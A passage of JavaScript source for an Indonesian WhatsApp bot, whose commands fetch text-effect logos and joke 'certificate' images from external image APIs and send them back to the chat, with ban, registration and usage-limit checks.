					vhbuff = await getBuffer(`https://api.vhtear.com/foil_text?text=VHTEAR&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'bloodtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}bloodtext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/blood_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'hekertext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}hekertext Dns`)
					reply(`[??] Heker AbiZzz`)
					vhbuff = await getBuffer(`https://api.vhtear.com/matrix_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'bokehtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}bokehtext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/bokeh_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'carbontext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}carbontext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/carbon_text?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'avengerstext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(14)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}avengerstext Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/avengers_text?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'watertext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}watertext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/water_maker?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'firetext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}firetext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/fire_maker?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'metaltext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}metaltext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/metal_maker?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'ballontext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}ballontext Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/balloonmaker?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'gemboktext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}gemboktext 11 01 2021 & Dns Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/padlock?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'bannerff':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(10)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}bannerff Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/bannerff?title=${ve}&text=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'aloklogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}aloklogo Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/logoff?hero=alok&text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'miyalogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}miyalogo Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/logoml?hero=miya&text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'gamelogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}gamelogo Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/gamelogo?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'blackpink':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}blackpink Dns`)
					reply(`[😱] Hah Blekping :v`)
					vhbuff = await getBuffer(`https://api.vhtear.com/blackpinkicon?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'thundername':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}thundername Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/thundertext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'silktext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}silktext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/silktext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'partytext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}partytext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/partytext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'romancetext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}romancetext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/romancetext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'googletext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					var ga = gh.split("&")[2];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}googletext Dns & Bot & Wea`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/googletext?text1=${ve}&text2=${za}&text3=${ga}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'glowtext2':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}glowtext2 Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/glowtext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'lovemessage':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}lovemessage Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'glitchtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}glitchtext Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/glitchtext?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'galaxytext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}galaxytext Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/galaxytext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'pornhub':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(9)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}pornhub Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/pornlogo?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
					case 'tahta':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				var teks = args.join(' ')
				if (!teks) return dila.sendMessage(from, 'Input teks yang ingin di tulis', MessageType.text, { quoted:Lan })
				var buffer = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${teks}&apikey=apivinz`)
				dila.sendMessage(from, buffer, MessageType.image, { caption: `Harta Tahta ${teks}`, quoted:Lan})
				break
				case 'wetglass':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}wetglass Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/wetglass?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'stylelogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}stylelogo Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/stylelogo?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'watercolor':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}watercolor Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/watercolor?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'wolflogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(10)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}wolflogo Dns  & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/avatarwolf?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
/*]====> BY RAMLAN ID <====[*/
				case 'sertifikatmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const serti = `\`\`\`┌─❏「 ${pushname} 」\`\`\`
\`\`\`│◪ ${prefix}sertiharam\`\`\`
\`\`\`│◪ ${prefix}sertibabu\`\`\`
\`\`\`│◪ ${prefix}sertibucin\`\`\`
\`\`\`│◪ ${prefix}sertibocilff\`\`\`
\`\`\`│◪ ${prefix}sertigay\`\`\`
\`\`\`│◪ ${prefix}sertipacar\`\`\`
\`\`\`│◪ ${prefix}sertisadboy\`\`\`
\`\`\`│◪ ${prefix}sertisurga\`\`\`
\`\`\`│◪ ${prefix}sertipinter\`\`\`
\`\`\`│◪ ${prefix}sertibadboy\`\`\`
\`\`\`│◪ ${prefix}sertibadgirl\`\`\`
\`\`\`│◪ ${prefix}sertigoodgirl\`\`\`
\`\`\`│◪ ${prefix}sertigoodboy\`\`\`
\`\`\`│◪ ${prefix}sertieditor\`\`\`
\`\`\`│◪ ${prefix}sertigudluking\`\`\`
\`\`\`│◪ ${prefix}sertipakboy\`\`\`
\`\`\`│◪ ${prefix}sertijamet\`\`\`
\`\`\`│◪ ${prefix}sertiyutub\`\`\`
\`\`\`│◪ ${prefix}sertiheker\`\`\`
\`\`\`│◪ ${prefix}sertiff1\`\`\`
\`\`\`│◪ ${prefix}sertiff2\`\`\`
\`\`\`│◪ ${prefix}sertiff3\`\`\`
\`\`\`│◪ ${prefix}sertiff4\`\`\`
\`\`\`│◪ ${prefix}sertiff5\`\`\`
\`\`\`│◪ ${prefix}sertipubg1\`\`\`
\`\`\`│◪ ${prefix}sertipubg2\`\`\`
\`\`\`│◪ ${prefix}sertiml\`\`\`
\`\`\`└─❏「 ${pushname} 」\`\`\``
					dila.sendMessage(from, serti, text, { thumbnail: dnsnew, sendEphemeral: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 999, status: 200, thumbnail: fs.readFileSync('./src/image/thumbnail.jpeg'), surface: 200, message: 'Sertifikat Menu', orderTitle: 'Sertifikat Menu', sellerJid: '0@s.whatsapp.net'}}}})
					break
                    case 'sertiharam':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiharam botwea`)
                    reply(dla.wait())
                    menghayu = await getBuffer(`http://onlydevcity.xyz/AnakHaramSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, menghayu, image, { quoted: Lan })
                    break
                    case 'sertibabu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibabu botwea`)
                    reply(dla.wait())
                    sertibab = await getBuffer(`http://onlydevcity.xyz/BabuSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibab, image, { quoted: Lan })
                    break
                    case 'sertibucin':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibucin botwea`)
                    reply(dla.wait())
                    sertibuci = await getBuffer(`http://onlydevcity.xyz/BucinSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibuci, image, { quoted: Lan })
                    break
                    case 'sertibocilff':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibocilff botwea`)
                    reply(dla.wait())
                    sertibocilf = await getBuffer(`http://onlydevcity.xyz/CilEpepSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibocilf, image, { quoted: Lan })
                    break
                    case 'sertigay':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertigay botwea`)
                    reply(dla.wait())
                    sertiga = await getBuffer(`http://onlydevcity.xyz/GaySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiga, image, { quoted: Lan })
                    break
                    case 'sertipacar':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipacar botwea`)
                    reply(dla.wait())
                    sertipaca = await getBuffer(`http://onlydevcity.xyz/PacarSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipaca, image, { quoted: Lan })
                    break
                    case 'sertisadboy':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertisadboy botwea`)
                    reply(dla.wait())
                    sertisadbo = await getBuffer(`http://onlydevcity.xyz/SadBoySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertisadbo, image, { quoted: Lan })
                    break
                    case 'sertisurga':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertisurga botwea`)
                    reply(dla.wait())
                    sertisurg = await getBuffer(`http://onlydevcity.xyz/SurgaSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertisurg, image, { quoted: Lan })
                    break
                    case 'sertipinter':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipinter botwea`)
                    reply(dla.wait())
                    sertipinte = await getBuffer(`http://onlydevcity.xyz/PintarSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipinte, image, { quoted: Lan })
                    break
                    case 'sertibadboy':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibadboy botwea`)
                    reply(dla.wait())
                    sertibadbo = await getBuffer(`http://onlydevcity.xyz/BadBoySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibadbo, image, { quoted: Lan })
                    break
                    case 'sertibadgirl':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibadgirl botwea`)
                    reply(dla.wait())
                    sertibadgir = await getBuffer(`http://onlydevcity.xyz/BadGirlSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibadgir, image, { quoted: Lan })
                    break
                    case 'sertigoodgirl':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertigoodgirl botwea`)
                    reply(dla.wait())
                    sertigoodgir = await getBuffer(`http://onlydevcity.xyz/GoodGirlSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertigoodgir, image, { quoted: Lan })
                    break
                    case 'sertigoodboy':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertigoodboy botwea`)
                    reply(dla.wait())
                    sertigoodbo = await getBuffer(`http://onlydevcity.xyz/GoodBoySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertigoodbo, image, { quoted: Lan })
                    break
                    case 'sertieditor':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertieditor botwea`)
                    reply(dla.wait())
                    sertiedito = await getBuffer(`http://onlydevcity.xyz/EditorBerkelasSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiedito, image, { quoted: Lan })
                    break
                    case 'sertigudluking':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertigudluking botwea`)
                    reply(dla.wait())
                    sertigudlukin = await getBuffer(`http://onlydevcity.xyz/GoodLookingSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertigudlukin, image, { quoted: Lan })
                    break
                    case 'sertipakboy':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipakboy botwea`)
                    reply(dla.wait())
                    sertipakbo = await getBuffer(`http://onlydevcity.xyz/FucekBoySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipakbo, image, { quoted: Lan })
                    break
                    case 'sertijamet':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertijamet botwea`)
                    reply(dla.wait())
                    sertijame = await getBuffer(`http://onlydevcity.xyz/JametSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertijame, image, { quoted: Lan })
                    break
                    case 'sertiyutub':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiyutub botwea`)
                    reply(dla.wait())
                    sertiyutu = await getBuffer(`http://onlydevcity.xyz/YoutuberSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiyutu, image, { quoted: Lan })
                    break
                    case 'sertiheker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiheker botwea`)
                    reply(dla.wait())
                    sertiheke = await getBuffer(`http://onlydevcity.xyz/HekerSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiheke, image, { quoted: Lan })
                    break
                    case 'sertiff1':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff1 botwea`)
                    reply(dla.wait())
                    sertiff = await getBuffer(`http://onlydevcity.xyz/FFSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiff, image, { quoted: Lan })
                    break
                    case 'sertiff2':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff2 botwea`)
                    reply(dla.wait())
                    sertif = await getBuffer(`http://onlydevcity.xyz/FFSerti2/img.php?nama=${q}`)
                    dila.sendMessage(from, sertif, image, { quoted: Lan })
                    break
                    case 'sertiff3':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff3 botwea`)
                    reply(dla.wait())
                    sertifa = await getBuffer(`http://onlydevcity.xyz/FFSerti3/img.php?nama=${q}`)
                    dila.sendMessage(from, sertifa, image, { quoted: Lan })
                    break
                    case 'sertiff4':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff4 botwea`)
                    reply(dla.wait())
                    sertifb = await getBuffer(`http://onlydevcity.xyz/FFSerti4/img.php?nama=${q}`)
                    dila.sendMessage(from, sertifb, image, { quoted: Lan })
                    break
                    case 'sertiff5':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff5 botwea`)
                    reply(dla.wait())
                    sertifc = await getBuffer(`http://onlydevcity.xyz/FFSerti5/img.php?nama=${q}`)
                    dila.sendMessage(from, sertifc, image, { quoted: Lan })
                    break
                    case 'sertipubg1':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
